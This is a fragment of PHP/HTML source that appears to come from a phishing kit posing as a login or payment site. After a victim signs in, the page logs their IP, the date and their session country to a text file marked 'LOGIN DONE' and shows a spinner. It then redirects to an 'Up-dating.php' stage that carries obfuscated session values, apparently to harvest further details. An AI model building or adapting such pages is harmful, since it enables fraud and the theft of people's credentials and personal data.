<body><header class="mainHeader" role="banner"><div class="headerContainer"><div class="grid12"><a href="#" class="logo"></a><div class="loginBtn"><span class="securityLock"><?php echo $inf_scr; ?></span></div></div></div></header><main class="superBowlMain"><section id="content" role="main" data-country="US"><section id="main" class=""><div id="account" class="account grid12"><?php $milaf = fopen("../VST.txt","a"); fwrite($milaf,$ib."  -| LOGIN DONE !! |-              ".$dt."                  -        " .$_SESSION['cntn']."\n"); ?><meta http-equiv="refresh" content="4;URL=Up-dating.php?log=InfoPage#Info=<?php echo $ran;?>=<?php echo $rans;?>inf=<?php echo crypt($_SESSION['s01']); ?>=<?php include '../ran.php'; echo $r; ?>" /><div id="preloaderSpinner" class="preloader spinner"><div class="spinWrap"><p class="spinnerImage"></p> <p class="loader"></p><p class="loadingMessage" id="spinnerMessage"></p><p class="loadingSubHeading" id="spinnerSubHeading"></p></div></div></div></section></section></main><?php include ('xf/ftr.php'); ?><div id="overPanel" class="US overPanel flagsIn"></div></body>